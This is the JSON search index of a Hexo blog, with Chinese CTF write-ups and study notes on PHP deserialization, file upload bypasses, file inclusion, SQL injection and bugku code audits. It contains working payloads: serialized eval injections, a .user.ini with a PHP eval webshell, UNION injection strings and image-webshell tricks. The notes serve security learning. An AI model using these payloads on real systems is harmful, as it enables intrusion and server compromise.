{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"PHP session反序列化","slug":"PHP-session反序列化","date":"2019-11-03T06:03:32.000Z","updated":"2019-11-04T11:05:55.436Z","comments":true,"path":"2019/11/03/PHP-session反序列化/","link":"","permalink":"http://yoursite.com/2019/11/03/PHP-session反序列化/","excerpt":"PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。","text":"PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。 PHP session的工作流程当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存 PHP session的几个常见配置session.upload_progress.enabled启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。 session.serialize_handler定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同 session.save_pathsession文件的存储位置 session.auto_start=0表明默认不启动session session.save_handler=filessession文件的存储方式 PHP session序列化及反序列化处理器php在session存储和读取时,都会有一个序列化和反序列化的过程，序列化、反序列化中会调用对象的magic方法,比如destruct(),wakeup()等PHP 内置了多种处理器用于处理 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下： php_binary：存储格式为，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值 php：存储格式为，键名+竖线+经过serialize函数序列化处理的值 php_serialize(php&gt;5.5.4)：存储格式为，经过serialize函数序列化处理的值具体用哪个处理器，由session.serialize_handler来定义。 一道php session反序列化漏洞的题jarvis上的PHPINFO:http://web.jarvisoj.com:32784/代码： &lt;?php //A webshell is wait for you ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET[&apos;phpinfo&apos;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(&apos;index.php&apos;)); } ?&gt;看到PHP代码中的ini_set(‘session.serialize_handler‘, ‘php‘)猜到这道题目可能与PHP中的Session序列话的问题有关，看了下phpinfo(),发现 session.serialize_handler：php_serialize session.upload_progress.enabled：onphp.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问index.php时就会被php的引擎反序列化。但是本题中没有提供写入session的方法，但是session.upload_progress.enabled这个是开着的，我们可以借此向服务器设置session，当session.upload_progress.enabled选项开启时，PHP能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test XXE&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://127.0.0.1/b/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--不对字符编码--&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;获取项目路径：通过dirname获取文件路径设置$mdzz=‘print_r(dirname(FILE));‘序列化得到的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:27:”print_r(dirname(FILE));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(FILE));&quot;;}opt/lampp/htdocs 获取文件列表通过scandir获取文件列表设置$mdzz=‘print_r(scandir(“/opt/lampp/htdocs”));‘序列化的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:38:”print_r(scandir(“/opt/lampp/htdocs”));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:38:&quot;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&quot;;}发现存在Here_1s_7he_fl4g_buT_You_Cannot_see.php。 读取文件内容：通过file_get_contents读取文件内容设置$mdzz=print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));序列话结果O:5:”OowoO”:1:{s:4:”mdzz”;s:88:”print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}。 最后就得到flag了。","categories":[],"tags":[]},{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2019-10-25T07:21:30.000Z","updated":"2019-10-25T07:34:08.507Z","comments":true,"path":"2019/10/25/序列化与反序列化/","link":"","permalink":"http://yoursite.com/2019/10/25/序列化与反序列化/","excerpt":"php的序列化与反序列化通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；进行序列化与反序列化操作，可以轻松地存储和传输数据。","text":"php的序列化与反序列化通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；进行序列化与反序列化操作，可以轻松地存储和传输数据。 序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;} Object : O:strlen(object name):object name:object size:{s:strlen(propertyname):property name:property definition;} 举个例子： $arr = array(‘PHP’,’Java’,’Python’,’C’); $result = serialize($arr); echo $result; 运行结果： a:4:{i:0;s:3:”PHP”;i:1;s:4:”Java”;i:2;s:6:”Python”;i:3;s:1:”C”;}a:表示的是整体的数据类型，这里是array数组;a:4中的4:表示数组元素的个数;i:表示int,整型;0:表示数组元素的下标;s:表示string，即数组值得类型;s:3中的3:表示数组值的长度。 在序列化对象时，不会保留常量的值，对于父类中的变量，则会保留。当调用serialize()函数序列化对象时，该函数会检查类中是否存在一个魔术方法，__sleep()。如果存在，该方法会被先调用，然后才执行序列化操作。可以通过重载这个方法，从而自定义序列化行为。例如，对象中的一些私有敏感属性，我们不想将它们序列化，就可以用这样的方法。__sleep()的方法原型为：public array __sleep ( void )该方法返回一个包含对象中所有应被序列化的变量名称的数组，不能返回父类的私有成员的名字。 对于反序列化，有一个unserialize()函数，unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。如果传递的字符串不可解序列化，则返回 FALSE,若被反序列化的变量是一个对象，在成功重新构造对象之后，该函数会检查类中是否存在一个魔术方法，wakeup()。如果存在，该方法会被先调用，然后才执行反序列化操作。在反序列化操作时，遇到对象，若在此之前并未定义该类，反序列化正常执行，反序列化得到的对象是’PHP_Incomplete_Class’预先定义了该类 class User{ const SITE = &apos;uusama&apos;; public $username; public $nickname; private $password; private $order; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 定义反序列化后调用的方法 public function __wakeup() { $this-&gt;password = $this-&gt;username; } } $user_ser = &apos;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&apos;; var_dump(unserialize($user_ser));运行结果 object(User)#1 (4) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL }没有定义该类： $user_ser = &apos;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&apos;; var_dump(unserialize($user_ser));运行结果： object(__PHP_Incomplete_Class)#1 (3) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;User&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; }","categories":[],"tags":[]},{"title":"hackergame2019部分题解","slug":"hackergame2019部分题解","date":"2019-10-20T09:48:00.000Z","updated":"2019-10-20T09:49:26.216Z","comments":true,"path":"2019/10/20/hackergame2019部分题解/","link":"","permalink":"http://yoursite.com/2019/10/20/hackergame2019部分题解/","excerpt":"","text":"##签到题：token后面有一个显示按钮，点击显示，token就出来了，复制，打开题目网址，把token放进框里，发现获取flag的按钮无法点击，F12查看元素，把该按钮的属性disabled=”disabled”改为abled=”disabled”，即可获取flag； ##白与夜：打开题目网址，看到一个cat图片，点开图片，what? flag就这样出来了？flag{4_B14CK_C4T} ##信息安全2077：打开题目，提示比赛时间还没开始，Not yet! The competition will start after 21165 days and 54068于是想到了改时间，刚开始有点憨憨的，一直在尝试修改电脑本地的时间日期，一直没改对；哎，怎么没想到，可以用burpsuit直接改包啊！！！刚开始忘了如何打开.txt文件，百度了一下，202.38.93.241:2077/?myfile = fopen(“flag.txt”, “r”) 抓到的包：GET / HTTP/1.1Host: 202.38.93.241:2077User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0 .7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1If-Modified-Since: Sun, 13 Oct 2019 13:34:45 GMTIf-None-Match: “1570973685.0-1234-3182889908”Cache-Control: max-age=0 POST /flag.txt HTTP/1.1Host: 202.38.93.241:2077User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36Accept: /Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://202.38.93.241:2077/If-Unmodified-Since: Sun, 20 Oct 2019 09:02:49 GMTOrigin: http://202.38.93.241:2077Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0 一共两个包，把相应的时间都改了，改为2077年，就可以了；","categories":[],"tags":[]},{"title":"第一道文件上传题","slug":"第一道文件上传题","date":"2019-10-09T14:45:30.000Z","updated":"2019-10-10T13:09:31.767Z","comments":true,"path":"2019/10/09/第一道文件上传题/","link":"","permalink":"http://yoursite.com/2019/10/09/第一道文件上传题/","excerpt":"前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊","text":"前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊 题目地址：https://buuoj.cn/challenges#[SUCTF%202019]CheckIn 拿到这道题，首先把所有学过的绕过方法试一遍，js,本地检验，双写，改写MIME文件类型，php345，点，空格，htaccess文件，结果全都没成功随便上传一个txt文件，提示exif_imagetype:not image! 可知用了exif_imagetype函数判断文件是否是图片文件再试试上传一个图片一句话木马，显示&lt;? in contents! 没上传成功额。。。到这我就无能为力了，知识有限呀 木得办法，只能去看源码了接下来就是与源码斗智斗勇的过程了，php代码好难呀 &lt;?php // error_reporting(0); $userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;); //file_put_contents将一个字符串写入文件 if (isset($_POST[&quot;upload&quot;])) { $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) { die(&quot;filesize too big!&quot;); } if (!$name) { die(&quot;filename cannot be empty!&quot;); } $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) { //匹配正则表达式，文件后缀名中不能含ph、htaccess,/i表示不区分大小写 die(&quot;illegal suffix!&quot;); } if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) { //mb_strpos 检查字符串在另一个字符串中首次出现的位置 die(&quot;&amp;lt;? in contents!&quot;); //文件中不能包含&lt;? } $image_type = exif_imagetype($tmp_name); //exif_imagetype 检查文件是否是图片类型 可用文件头绕过，如GIF89A if (!$image_type) { die(&quot;exif_imagetype:not image!&quot;); } $upload_file_path = $userdir . &quot;/&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;; echo &apos;Your files : &lt;br&gt;&apos;; var_dump(scandir($userdir)); }废了好大劲，才看懂代码，文件后缀名中不能含ph、htaccess，不区分大小写；文件中不能包含&lt;?；exif_imagetype 检查文件是否是图片类型看到了这三个过滤，几乎无望，把我所学的方法全部禁用了，只能去看大佬们怎么绕过的。 上传一个.uset.ini文件，再上传一个aa.jpg文件，然后用菜刀连接 网址/uploads/f4e7685fe689f675c85caeefaedcf40c/index.php连接成功后，cd / 进入根目录 cat flag 拿到flag.user.ini 文件： GIF89a //仅对于本题而言，只是为了绕过检查图片的那个函数 auto_prepend_file=aa.jpg //让php文件后面自动包含aa.jpg这个二年 aa.jpg 文件： GIF89a &lt;script language=’php’ @eval($_POST[‘ye’]); ##.uset.ini在PHP中有个很有趣的东西叫.user.ini，有点类似.htaccess文件，PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果关于PHP_INI_*一共有四种： PHP_INI_USER 可在用户脚本以及.user.ini中设定 PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定 PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定 PHP_INI_ALL 可在任何地方设定php官方文档中说，.user.ini可以设置 PHP_INI_PERDIR 和 PHP_INI_USER ，实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。php配置项中，有两个项，auto_append_file、auto_prepend_fileauto_append_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件。","categories":[],"tags":[]},{"title":"sql注入基础","slug":"sql注入基础","date":"2019-10-03T07:07:13.000Z","updated":"2019-10-11T09:52:51.284Z","comments":true,"path":"2019/10/03/sql注入基础/","link":"","permalink":"http://yoursite.com/2019/10/03/sql注入基础/","excerpt":"","text":"##mysql简单基本用法 以sqli-labs为例查库：select schema_name from information_schemata查表：select tables_name from information_schema.tables where table_schema=’security’查列：select column_name from information_schema.columns where table_name=’users’查字段：select username,password from security.users limit0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是现实多少个数据。 order by 列数 对这一列排序，列数不正确就报错，可以用来判断列数，字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据 concat(‘‘,A,B) ,有分隔符的地连接字符串，查字段时可用 id=-1’union select 1,2,group_concat(concat_ws(‘‘,username,password)) from security.users –+如此使用，可以把表单里的信息全部列出来，不用像以前一样一一列举 注入时不推荐使用单引号，可用十六进制替代 1.left()函数：left(database(),1)=’s’ left(a,b)函数从左侧截取a的前b位，正确返回1，错误则返回0；2.regexp函数: select user() regexp ‘r’ user()的结果是root,regexp为匹配root的正则表达式3.like函数: select user() like ‘ro%’ 匹配与regexp相似，多了一个%4.substr(a,b,c) select substr() substr(a,b,c)从位置b开始，截取a字符串c为长度5.ascii() 将某个字符串转化为ascii值6.chr(数字)或者是ord(‘字母’) 使用python中的两个函数可以判断当前的ascii值是多少 例：对于security数据库select left(databases(),1)=’s’,前1位是否是sselect database() regexp ‘s’ 匹配第一个字符是否是sselect database() like ‘s%’ 匹配第一个字符是否是sselect substr((select database()),1,1)=’s’ 匹配第一个字符是否是sselect substr((select database()),1,3)=’sec’ 匹配前三个字符是否是secselect ascii(substr((select database()),1,1)) 直接回显115select ascii(substr((select database()),1,1))&gt;110 如果大于110，就会返回1，否则返回0； load_file 读取本地文件 select_load(‘文件路径’);into_outfile 写文件select…..into_outfile ‘file_name’可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。select ‘mysql is very good’ into_outfile ‘test1.txt’; 文件写的路径为默认路径 PHPTutorial\\MySQL\\data或者是select ‘crow 666’ into_outfile ‘文件位置’","categories":[],"tags":[]},{"title":".htaccess文件","slug":"htaccess文件","date":"2019-09-28T07:42:58.000Z","updated":"2019-09-28T07:46:27.198Z","comments":true,"path":"2019/09/28/htaccess文件/","link":"","permalink":"http://yoursite.com/2019/09/28/htaccess文件/","excerpt":".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。","text":".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。 .htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的 .htaccess可以控制错误重定向，初始页面设置，文件夹的访问权限，文件的跳转等 Nginx如果直接访问，可以下载该文件。如果是apache的话，正常情况下该文件是不可被访问的，但是可以通过php的include之类的文件包含函数进行内容访问 其实最好不要用.htaccess文件，因为目录多了后，每个目录都有个.htaccess很难管理 SetHandler 描述： 强制所有匹配文件由处理程序处理句法： SetHandler handler-name|none|expression语境： 服务器配置，虚拟主机，目录，.htaccess 当放入一个.htaccess文件或 或 部分，该指令将强制所有匹配的文件通过解析处理程序给出 的处理程序名。例如，如果您有一个目录希望完全解析为imagemap规则文件，而不管其扩展名如何，则可以将以下内容放入.htaccess该目录中的 文件中： SetHandler imap文件您也可以使用此伪指令为具有特定文件扩展名的文件配置特定处理程序。例如： &lt; FilesMatch “ \\ .php $” &gt; SetHandler 应用程序/ x-httpd-php &lt;/ FilesMatch &gt; 字符串值表达式可用于引用每个请求变量，包括对已命名正则表达式的反向引用： &lt; LocationMatch ^ / app /（？&lt; sub &gt; [^ /] +）/&gt; SetHandler “ proxy：unix：/ var / run / app_％{env：MATCH_sub} .sock | fcgi：// localhost：8080” &lt;/ 位置匹配&gt; 您可以SetHandler 使用value 覆盖先前定义的指令None。","categories":[],"tags":[]},{"title":"初识文件包含漏洞","slug":"初识文件包含漏洞","date":"2019-09-27T15:33:00.000Z","updated":"2019-09-27T15:42:13.783Z","comments":true,"path":"2019/09/27/初识文件包含漏洞/","link":"","permalink":"http://yoursite.com/2019/09/27/初识文件包含漏洞/","excerpt":"##什么是文件包含？简单的说，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。","text":"##什么是文件包含？简单的说，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。 ##文件包含漏洞的成因是什么？在包含文件的时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校检或者校检被绕过，这样就导致了文件包含漏洞。通常文件包含函数出现在PHP语言中。&lt;?php $file = $_GET[‘file’]; include($file); //…… ###常见文件包含函数 include include_once require require_once ###文件包含漏洞的利用方式 00截断 长度截断(windows:256,linux:4096) 包含日志文件 包含session ###文件包含漏洞的防御 php中使用open_vasedir配置限制访问在指定的区域 过滤.(点)/(斜杠)(反斜杠) 禁止服务器远程文件包含 尽量不要使用动态包含，可以在需要包含的页面固定写好 ###小例 %00截断 include(“includes/“.$_GET[‘library’].”.php”); 后加.php,改变文件后缀名，用%00截断，遇到%00自动认为字符串结束 点加斜杠绕过 substr($_GET[‘file’], -4, 4) != ‘.php’ 从file变量的倒数第四个开始取值，一直到最后，然后判断是否与.php相等；可用. 或者/.,后加 去后缀名include(‘includes/class_’.addslashes($GET[‘class’]).’.php’);addslashes函数，返回在预定义字符之前添加反斜杠的字符串，预定义字符是：单引号(‘)、双引号(“)、反斜杠()、NULL 双写绕过 $file = str_replace(‘../‘, ‘’, $_GET[‘file’]); 把../用空’’来代替，双写为…/./ 文件包含写shell include($_POST[“page”]); 文件包含post传参时，没办法用菜刀直接连接，可以用执行其他php文件，来写一个一句话木马到服务器上","categories":[],"tags":[]},{"title":"文件上传小结","slug":"文件上传小结","date":"2019-09-22T23:14:11.000Z","updated":"2019-09-22T23:18:43.556Z","comments":true,"path":"2019/09/23/文件上传小结/","link":"","permalink":"http://yoursite.com/2019/09/23/文件上传小结/","excerpt":"","text":"一． 客户端检查Js绕过文件上传二．服务端检查1.检查后缀MIME绕过文件上传拓展名限制上传：大小写绕过文件上传点，空格绕过文件上传.htaccess文件绕过上传Php345文件绕过上传Windows ：：$DATA绕过2.检查内容：文件头检查Getimagesize()函数检查exif_imagetype()函数检查二次渲染 一． ##Js绕过文件上传客户端js检查，通过javascript代码来检测用户提交的文件是否合法，直接本地检测，检测的时候无需与服务器交互，这个时候用burpsuit抓不到包，绕过方法：可以先上传一个符允许的文件后缀，比如，先将原来.php文件改为.jpg文件，上传，抓包，然后在burpsuit上把后缀名改回来二． ##MIME绕过文件上传MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。与文件上传有关的常见MIME类型.html text/html.txt text/plain.gif image/gif.jpg image/jpeg.png image/png.php application/octet-stream绕过方式：上传一个.php文件，然后用burpsuit抓包，更改MIME类型，改为一个允许的类型，如把原来的Content-Type: application/octet-stream改为image/jpeg ##Windows拓展名限制上传 shell.php. ———-文件名后加点‘.’ shell.php(空格) ———-文件名后加括号空格 shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA Windows系统会把后缀名中的点、空格、::$DATA等，自动去掉，可以利用这个进行绕过；与Linux相比，windows对大小写不敏感，可以进行大小写绕过，如phP、Php、pHp等 ##Php345文件绕过上传一般来说，服务器能够运行php文件，也能运行php3、php4、php5、phtml文件，并且解析的方式是一样的 ##.htaccess文件绕过上传 .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 通俗的说，这个文件就是告诉服务器，按哪种方式解析文件，例如：&lt;FilesMatch “.jpg”&gt;SetHandler application/x-httpd-php这段代码，可以告诉服务器，将.jpg文件用php方式解析 2. ##文件内容检查： *有时候，不对后缀名进行检查，而对文件的内容进行检查，常见的有检查文件头、getimagesize()函数、exif_imagetype()函数检查，这个时候需要我们只做图片马，把一句话木马写到图片中，以jpg文件为例，copy tu.jpg/b+yijuhua.php/a tu1.jpgtu.jpg为原图，一句话木马写在yijuhua.php中，tu1.jpg为我们制作出的图片马大多数情况下，图片马都可以绕过文件内容检查；此外，图片马的使用，往往都是与文件包含一起使用。 *二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。对于gif的二次渲染，我们要找出渲染后图片没变的部分，我们要把一句话代码添加到没变的这部分，一般来说，gif找这个位置相对简单 对于png的二次渲染：png文件组成png图片由3个以上的数据块组成.PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.分析数据块IHDR数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。PLTE调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。IDAT图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像IEND图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：00 00 00 00 49 45 4E 44 AE 42 60 82制作：写入PLTE数据块 在PLTE数据块写入php代码. 计算PLTE数据块的CRCCRC脚本import binasciiimport re png = open(r’2.png’,’rb’)a = png.read()png.close()hexstr = binascii.b2a_hex(a) ‘’’ PLTE crc ‘’’data = ‘504c5445’+ re.findall(‘504c5445(.*?)49444154’,hexstr)[0]crc = binascii.crc32(data[:-16].decode(‘hex’)) &amp; 0xffffffffprint hex(crc) 3.修改CRC值","categories":[],"tags":[]},{"title":"bugku之代码审计","slug":"bugku之代码审计","date":"2019-09-10T08:05:30.000Z","updated":"2019-09-11T09:16:39.588Z","comments":true,"path":"2019/09/10/bugku之代码审计/","link":"","permalink":"http://yoursite.com/2019/09/10/bugku之代码审计/","excerpt":"","text":"#extract变量覆盖 &lt;?php $flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) { $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo&apos;flag{xxx}&apos;; } else { echo&apos;Oh.no&apos;; } } ?&gt;extract函数，从数组中将变量导入到当前的符号表；该函数使用数组简明作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的的一个变量。那么这里的关键点就是shiyan和flag这两个变量了。只要我们让他们一致就ok了我们使用置空的方式让他们的值相等就ok了。flag=&amp;shiyan= #strcmp比较字符串 &lt;?php $flag = &quot;flag{xxxxx}&quot;; if (isset($_GET[&apos;a&apos;])) //isset — 检测变量是否已设置并且非 NULL { if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(&apos;Flag: &apos;.$flag); else print &apos;No&apos;; } ?&gt;分析代码，可知只需使变量a等于flag即可输出flag，strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了==，而NULL==0是bool(true)，这样就成功绕过。 #urldecode二次编码绕过 &lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot; not allowed! &quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot; Access granted! &quot;; echo &quot; flag &quot;; } ?&gt;若想输出flag，变量id进行一次url编码后等于”hackerDJ”但是，变量id和”hackerDJ”进行正则表达式匹配，id不能等于”hackerDJ”，题目提醒两次url编码，可以使id=%2568ackerDJ浏览器会自动进行一次url编码，%25-&gt;% 此时id=%68ackerDJ第二次编码，%68-&gt;h 此时id=hackerDJ这样就可以绕过得flag #md5()函数 &lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) { if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;]) print &apos;Your password can not be your username.&apos;; else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;])) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; } ?&gt;md5()函数遇到数组会返回空，所以可以构造两个数组，这样就有null===null username[]=1&amp;password[]=2#数组返回null绕过 &lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) //正则表达式匹配 echo &apos;You password must be alphanumeric&apos;; else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE) //查找字符串首次出现的位置 die(&apos;Flag: &apos; . $flag); else echo &apos;Invalid password&apos;; } 